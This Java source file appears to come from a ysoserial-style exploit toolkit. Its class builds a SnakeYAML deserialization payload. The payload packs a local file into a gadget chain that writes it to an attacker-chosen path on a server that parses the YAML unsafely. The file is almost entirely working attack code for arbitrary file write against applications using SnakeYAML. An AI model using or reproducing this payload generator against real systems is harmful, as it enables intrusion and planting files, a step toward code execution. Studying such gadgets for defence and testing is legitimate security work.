package cn.butler.snakeyaml.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.yso.payloads.util.CommonUtil;
import org.apache.shiro.lang.codec.Base64;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.zip.DeflaterOutputStream;
import java.util.zip.InflaterInputStream;

public class MarshalOutputStream implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String[] split = command.split("\\|");
        String source = split[0];
        String destation = split[1];

        byte[] fileBytes= CommonUtil.getFileBytes(source);
        String content = Base64.encodeToString(deflaterCompress(fileBytes));

        String yamlPayload = "!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\"%s\"],false],!!java.util.zip.Inflater { input: !!binary %s },1048576]]";
        yamlPayload = String.format(yamlPayload, destation, content);
        return yamlPayload;
    }

    public static byte[] deflaterCompress(byte[] inputData) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (DeflaterOutputStream dos = new DeflaterOutputStream(baos)) {
            dos.write(inputData);
        }
        return baos.toByteArray();
    }

    public static byte[] inflaterDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
             InflaterInputStream iis = new InflaterInputStream(bais)) {

            byte[] buffer = new byte[1024];
            int length;
            while ((length = iis.read(buffer)) > 0) {
                baos.write(buffer, 0, length);
            }
        }
        return baos.toByteArray();
    }

    public static void main(final String[] args) throws Exception {
    }

}
